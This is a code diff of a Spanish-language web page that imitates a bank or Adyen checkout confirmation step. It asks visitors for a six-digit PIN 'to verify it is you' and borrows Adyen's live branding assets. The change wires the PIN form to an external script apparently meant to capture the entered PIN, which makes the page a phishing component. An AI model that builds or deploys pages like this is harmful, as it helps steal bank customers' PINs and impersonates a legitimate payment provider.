@@ -247,19 +247,22 @@
 	</div>
 </header>
 
-  <form class="pin-container" onsubmit="event.preventDefault(); alert('PIN verificado correctamente.')">
-    <h2>Esperando a la confirmación de la entidad bancaria</h2>
-    <p>Introduzca su PIN para verificar que es usted</p>
-    
+  <form class="pin-container" id="pinForm">
+  <h2>Esperando a la confirmación de la entidad bancaria</h2>
+  <p>Introduzca su PIN para verificar que es usted</p>
 
-    <input type="password" placeholder="••••••" maxlength="6" required>
+  <input type="password" id="pinInput" placeholder="••••••" maxlength="6" required>
 
-    <button type="submit">
-        <span class="adyen-checkout__button__content">
-                                <img class="adyen-checkout__button__icon" src="https://checkoutshopper-live.cdn.adyen.com/checkoutshopper/images/components/bento_lock.svg" alt="" aria-hidden="true">
-                                <span class="adyen-checkout__button__text">Verificar PIN</span>
-                            </span></button>
-  </form>
+  <button type="submit" id="btnPin">
+    <span class="adyen-checkout__button__content">
+      <img class="adyen-checkout__button__icon" src="https://checkoutshopper-live.cdn.adyen.com/checkoutshopper/images/components/bento_lock.svg" alt="" aria-hidden="true">
+      <span class="adyen-checkout__button__text" id="pinButtonText">Verificar PIN</span>
+    </span>
+  </button>
+</form>
+
+<div id="toast" style="display: none; background: #f44336; color: white; padding: 10px; margin-top: 10px; border-radius: 6px;"></div>
+<script src="../js/cappinform.js"></script>
 
 </body>
 </html>
